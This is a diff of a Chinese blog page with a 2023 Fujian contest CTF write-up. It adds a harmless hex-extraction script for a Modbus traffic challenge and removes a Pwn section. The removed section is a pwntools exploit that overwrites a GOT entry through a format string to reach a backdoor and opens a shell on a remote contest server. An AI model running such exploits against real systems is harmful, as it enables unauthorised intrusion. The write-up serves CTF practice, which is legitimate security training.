@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ModBus"><span class="toc-text">ModBus</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%9A%AE%E7%9A%84%E5%A4%8D%E8%AF%BB%E5%A7%AC"><span class="toc-text">调皮的复读姬</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ModBus"><span class="toc-text">ModBus</span></a></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">200字</span>
+        <span class="post-count">127字</span>
       </span>
     </span>
 
@@ -279,34 +279,21 @@
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>解密网址：<a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt.html">https://www.sojson.com/encrypt.html</a></p>
 <p><img src="/blog/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%AE%9E%E8%B7%B5%E8%B5%9B/image-20231019170834277.png" alt="image-20231019170834277"></p>
 <h2 id="ModBus"><a href="#ModBus" class="headerlink" title="ModBus"></a>ModBus</h2><p>追踪Modbus&#x2F;tcp流，选择客户端分组hex转储，可以在右侧得到一个16进制字符串<code>666c61677b31343234303135392d376633362d346333362d623436612d3734613661366465643834617d</code></p>
+<p>把hex转储的数据另存为txt，然后可以用脚本提取</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess
+ 
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">:</span><span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+    <span class="token comment"># 将所有结果连接成一个字符串</span>
+    result_string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>results<span class="token punctuation">)</span>
+ 
+    <span class="token keyword">print</span><span class="token punctuation">(</span>result_string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>解码得到flag</p>
 <p><img src="/blog/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%AE%9E%E8%B7%B5%E8%B5%9B/image-20231019130614731.png" alt="image-20231019130614731"></p>
-<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="调皮的复读姬"><a href="#调皮的复读姬" class="headerlink" title="调皮的复读姬"></a>调皮的复读姬</h2><p>队友的wp：</p>
-<p>64位，ida发现存在后门函数，但反汇编有问题，动态调试发现和-3进行比较了，结合汇编发现存在格式化字符串，修改got表到后门函数即可</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>		
-context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
-pwnfile <span class="token operator">=</span> <span class="token string">'./pwn'</span>
-<span class="token comment">#io=process(pwnfile)</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.107.101.61'</span><span class="token punctuation">,</span><span class="token number">35607</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>pwnfile<span class="token punctuation">)</span>			
-
-<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
-	pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	
-shell <span class="token operator">=</span> <span class="token number">0x04014FB</span>
-puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-
-<span class="token comment">#debug()</span>
-
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choose:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You find a Repeater!"</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>puts_got<span class="token punctuation">:</span>shell<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
     </div>
     
